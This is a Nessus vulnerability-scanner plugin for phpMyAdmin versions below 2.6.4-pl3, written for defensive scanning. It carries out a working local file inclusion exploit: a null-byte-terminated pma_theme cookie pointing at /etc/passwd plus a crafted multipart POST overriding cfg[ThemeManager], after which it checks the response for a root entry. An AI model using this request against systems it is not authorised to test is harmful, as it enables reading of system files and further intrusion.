#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20088);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2016/05/16 14:22:06 $");

  script_cve_id("CVE-2005-3300", "CVE-2005-3301");
  script_bugtraq_id(15169, 15196);
  script_osvdb_id(20259, 20260, 20261, 20262);

  script_name(english:"phpMyAdmin < 2.6.4-pl3 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpMyAdmin < 2.6.4-pl3");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
several flaws.");
  script_set_attribute(attribute:"description", value:
"The version of phpMyAdmin installed on the remote host is affected by
a local file inclusion vulnerability that can be exploited by an
unauthenticated attacker to read arbitrary files, and possibly even to
execute arbitrary PHP code on the affected host subject to the
permissions of the web server user id.

In addition, the application fails to sanitize user-supplied input to
the 'hash' parameter in the 'left.php' and 'queryframe.php' scripts as
well as the 'sort_order' and 'sort_by' parameters in the
'server_databases.php' script before using it to generate dynamic
HTML, which can lead to cross-site scripting attacks against the
affected application.");
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-5");
  script_set_attribute(attribute:"solution", value:"Upgrade to phpMyAdmin 2.6.4-pl3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/10/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin", "www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Make sure the affected script exists.
  r = http_send_recv3(method: "GET", item:string(dir, "/db_details_db_info.php"), port:port);
  if (isnull(r)) exit(0);

  # If it does...
  if (
    "<title>phpMyAdmin</title>" >< r[2] ||
    "<p>db_details_db_info.php: Missing parameter" >< r[2]
  ) {
    # Try to exploit the file inclusion flaw to read a file.
    #
    # nb: this could fail if PHP's magic_quotes is on or open_basedir
    #     restricts access to /etc or phpMyAdmin's mis-configured or ...
    file = "/etc/passwd";
    bound = "bound";
    # nb: the file we'll retrieve.
    set_http_cookie(name: "pma_theme", value: strcat(file, "%00"));

    boundary = string("--", bound);
    postdata = string(
      boundary, "\r\n",
      'Content-Disposition: form-data; name="lang"', "\r\n",
      "\r\n",
      "en-iso-8859-1\r\n",

      boundary, "\r\n",
      # nb: replace the $cfg array and set $cfg['ThemeManager'].
      'Content-Disposition: form-data; name="cfg[ThemeManager]"; filename="', SCRIPT_NAME, '"', "\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      # nb: contents are irrelevant.
      "\r\n",

      boundary, "--", "\r\n"
    );

    # nb: get by PMA_checkParameters() by using the default database name.
    r = http_send_recv3(method: "POST", port: port, data: postdata,
      item: dir+ "/db_details_db_info.php?db=phpmyadmin",
      add_headers: make_array("Content-Type", "multipart/form-data; boundary="+bound));
    if (isnull(r)) exit(0);

    # There's a problem if there's an entry for root.
    if (egrep(pattern:"root:.*:0:[01]:", string:r[2])) {
      if (report_verbosity > 0) {
        contents = r[2] - strstr(r[2], "<br />");
	security_warning(port:port, extra: contents);
      }
      else
        security_warning(port:port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }

  # If we're being paranoid.
  if (report_paranoia > 1) {
    # Report if the version number indicates it's vulnerable;
    # perhaps the exploit failed.
    if (ver =~ "^([01]\.|2\.([0-5]\.|6\.([0-3]([^0-9]|$)|4($|.*rc|.*pl[0-2]))))") {
      security_warning(port:port, extra: "
***** Nessus has determined the vulnerability exists on the remote
***** host simply by looking at the version number of phpMyAdmin
***** installed there.
");
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
